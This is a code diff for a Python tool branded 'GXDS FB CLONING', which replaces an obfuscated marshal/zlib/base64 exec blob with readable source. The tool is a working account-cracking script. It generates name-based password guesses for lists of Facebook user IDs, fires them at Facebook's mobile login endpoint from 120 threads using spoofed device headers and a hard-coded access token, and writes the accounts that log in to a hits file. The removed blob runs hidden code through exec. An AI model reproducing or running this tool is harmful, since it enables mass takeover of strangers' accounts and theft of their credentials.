@@ -1,5 +1,231 @@
-# GXDS TOOL
-#ENCRYPTION : Py3 MARSHAL+ZLIB+B64 BY INNOCENT BOY
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+
+import os, random, sys, json, uuid, time
+from concurrent.futures import ThreadPoolExecutor as ThreadPool
+
+try:
+    import requests
+except:
+    os.system("pip install requests -y")
+    import requests
+
+li = "\033[38;5;46m"
+blue = "\033[94m"
+white = "\033[1;97m"
+cyan = "\033[0;36m"
+yellow = "\033[1;33m"
+
+gxdsprnt=str(f"{white}"*37)
+lxgo=f"""{white}
+
+ d888b  db    db d8888b. .d8888. 
+88' Y8b `8b  d8' 88  `8D 88'  YP 
+88       `8bd8'  88   88 `8bo.   
+88  ooo  .dPYb.  88   88   `Y8b. 
+88. ~8~ .8P  Y8. 88  .8D db   8D 
+ Y888P  YP    YP Y8888D' `8888Y'
+ 
+       {cyan}FB CLONING ID V1\n"""
+ 
+def gxdslogo():
+    os.system('clear')
+    print(lxgo)
+    os.system('xdg-open https://www.facebook.com/goxdies')
+
+def main():
+    gxdslogo()
+    print("  [1] START HITTING FB\n  [2] EXIT TOOL")
+    print(gxdsprnt)
+    gxdsoption=input("  [•] CHOOSE OPTION: ")
+    os.system('clear')
+    print(lxgo)
+    if gxdsoption in ["A","a","1","01"]:
+        gxdsfiles()
+    elif gxdsoption in ["B","b","2","02"]:
+        print(gxdsprnt)
+        print("  [•] K, BYE.")
+        os.system('xdg-open https://www.facebook.com/goxdies')
+        print(gxdsprnt)
+        sys.exit()
+    else:
+        print(gxdsprnt)
+        print("  [X] ERROR!")
+        print(gxdsprnt)
+        time.sleep(3)
+        main()
+
+def gxdsfiles():
+    print(gxdsprnt)
+    fl=input("  [-] INPUT YOUR OWN FB IDS FILE TO START CRACKING.\n  \033[1;33m[•] FILE PATH: ")
+    os.system('clear')
+    print(lxgo)
+    print(gxdsprnt)
+    try:
+        id_file=open(fl,"r").read().splitlines()
+    except:
+        print("\033[1;91m  [X] FILE NOT FOUND.")
+        print(gxdsprnt)
+        sys.exit()
+    gxdsforward(id_file)
+
+def gxdsforward(id_file):
+    tl=str(len(id_file))
+    print("\033[38;5;46m=================================")
+    print("  [-] FB CLONING STARTED... ")
+    print("  [-] TIP: ON/OFF THE DATA EVERY 5 MINUTES\n           TO SPEED UP THE PROCESS. \n")
+    print("\033[38;5;46m=================================")
+    print("  [•] TOTAL ID IN FILE: "+tl)
+    print("  [•] PASSWORD LIST: AUTOMATIC ")
+    print("  [•] HIT FILE: /sdcard/goxdies.txt\n")
+    print("\033[38;5;46m=================================")
+        
+    print(gxdsprnt)
+    with ThreadPool (max_workers=120) as feel:
+        for data in id_file:
+            uid=data.split("|")[0]
+            pwx=[]
+            pwx.append('57273200')
+            pwx.append('59039200')
+            nam=data.split("|")[1]
+            name=nam.lower()
+            try:
+                name1=name.split(" ")[0]
+                nam1=nam.split(" ")[0]
+                if len(name1) <3:
+                    pass
+                else:
+                    pwx.append(nam1+'123')
+                    pwx.append(name1+'12')
+                    pwx.append(name1+'123')
+                    pwx.append(name1+'123')
+                    pwx.append(name1+'1234')
+                    pwx.append(name1+'12345')
+                    pwx.append(name1+'@123')
+                    pwx.append(name1+'pogi')
+                    pwx.append(name1+'ganda')
+                    pwx.append(name1+'143')
+                    pwx.append(name1+'@143')
+            except:pass
+            try:
+                mid_name=name.split(" ")[1]
+                nam2=nam.split(" ")[1]
+                if len(mid_name) <3:
+                    pass
+                else:
+                    pwx.append(nam1+" "+nam2)
+                    pwx.append(mid_name+'12')
+                    pwx.append(mid_name+'123')
+                    pwx.append(mid_name+' 123')
+                    pwx.append(mid_name+'1234')
+                    pwx.append(mid_name+'12345')
+                    pwx.append(mid_name+'@#')
+                    pwx.append(mid_name+'@@')
+                    pwx.append(mid_name+'@')
+                    pwx.append(mid_name+'@123')
+                    #-Mix
+                    pwx.append(name1+mid_name)
+                    pwx.append(name1+mid_name+'143')
+                    pwx.append(name1+mid_name+'12')
+                    pwx.append(name1+mid_name+'123')
+                    pwx.append(name1+mid_name+'1234')
+                    pwx.append(name1+mid_name+'12345')
+                    pwx.append(name1+mid_name+'@#')
+                    pwx.append(name1+mid_name+'@@')
+                    pwx.append(name1+mid_name+'@')
+                    pwx.append(name1+mid_name+'@123')
+                    pwx.append(name1+' '+mid_name)
+                    pwx.append(name1+' '+mid_name+'123')
+                    pwx.append(name1+' '+mid_name+'143')
+                    pwx.append(name1+' '+mid_name+'1234')
+                    pwx.append(name1+' '+sur_name)
+            except:pass
+            try:
+                sur_name=name.split(" ")[2]
+                nam3=nam.split(" ")[2]
+                if len(sur_name) <3:
+                    pass
+                else:
+                    pwx.append(sur_name+'123')
+                    pwx.append(sur_name+'1234')
+                    pwx.append(sur_name+'12345')
+                    pwx.append(sur_name+'143')
+                    pwx.append(name1+mid_name+sur_name)
+                    pwx.append(name1+mid_name+sur_name+'123')
+                    pwx.append(name1+mid_name+sur_name+'1234')
+                    pwx.append(name1+mid_name+sur_name+'12345')
+                    pwx.append(name1+mid_name+sur_name+'@#')
+                    pwx.append(name1+mid_name+sur_name+'@@')
+                    pwx.append(name1+mid_name+sur_name+'@')
+                    pwx.append(name1+' '+mid_name+' '+sur_name)
+                    pwx.append(name1+' '+mid_name+' '+sur_name+'123')
+            except:pass
+            feel.submit(file_subb,uid,pwx)
+
+loop=0
+oks=[]
+cps=[]
+def file_subb(uid,pwx):
+    global oks,loop,cps
+    sys.stdout.write(f"\r \033[1;35m [CHECKED]: {loop} || [HITS]: {str(len(oks))}");sys.stdout.flush()
+    session=requests.Session()
+    try:
+        for ps in pwx:
+            user_agent="Dalvik/2.1.0 (Linux; U; Android 9; moto e6 Build/PCB29.73-65-3) [FBAN/Orca-Android;FBAV/235.1.0.9.122;FBPN/com.facebook.orca;FBLC/en_US;FBBV/175782189;FBCR/Metro by T-Mobile;FBMF/motorola;FBBD/motorola;FBDV/moto e6;FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1344};FB_FW/1;]"
+            data = {
+            "adid": str(uuid.uuid4()),
+            "format": "json",
+            "device_id": str(uuid.uuid4()),
+            "cpl": "true",
+            "family_device_id": str(uuid.uuid4()),
+            "credentials_type": "device_based_login_password",
+            "error_detail_type": "button_with_disabled",
+            "source": "device_based_login",
+            "email": uid,
+            "password": ps,
+            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
+            "generate_session_cookies": "1",
+            "meta_inf_fbmeta": "",
+            "advertiser_id": str(uuid.uuid4()),
+            "currently_logged_in_userid": "0",
+            "locale": "en_US",
+            "client_country_code": "PH",
+            "method": "auth.login",
+            "fb_api_req_friendly_name": "authenticate",
+            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            "api_key": "882a8490361da98702bf97a021ddc14d"}
+            headers = {
+            'User-Agent': user_agent,
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Host': 'graph.facebook.com',
+            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
+            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
+            'X-FB-Connection-Type': 'MOBILE.LTE',
+            'X-Tigon-Is-Retry': 'False',
+            'X-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+            'X-fb-device-group': '5120',
+            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+            'X-FB-Request-Analytics-Tags': 'graphservice',
+            'X-FB-HTTP-Engine': 'Liger',
+            'X-FB-Client-IP': 'True',
+            'X-FB-Server-Cluster': 'True',
+            'X-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
+            p = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=headers,allow_redirects=False).text
+            q=json.loads(p)
+            if "session_key" in q:
+                print(f"\r\r\033[0;36m  [OK] {uid} : {ps}")
+                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
+                oks.append(uid)
+                break
+            elif "Please Confirm Email" in q:
+                print(f"\r\r\033[1;33m  [CE] {uid} : {ps}\n")
+                open("/sdcard/goxdies.txt","a+").write(uid+" : "+ps+"\n")
+                oks.append(uid)
+            elif "www.facebook.com" in q:
+                print(f"\r\r\033[1;91m  [CP] {uid} : {ps}")
+                cps.append(uid)
+            else:
+                continue
+        loop+=1
+    except:
+        time.sleep(2)
+
+main()
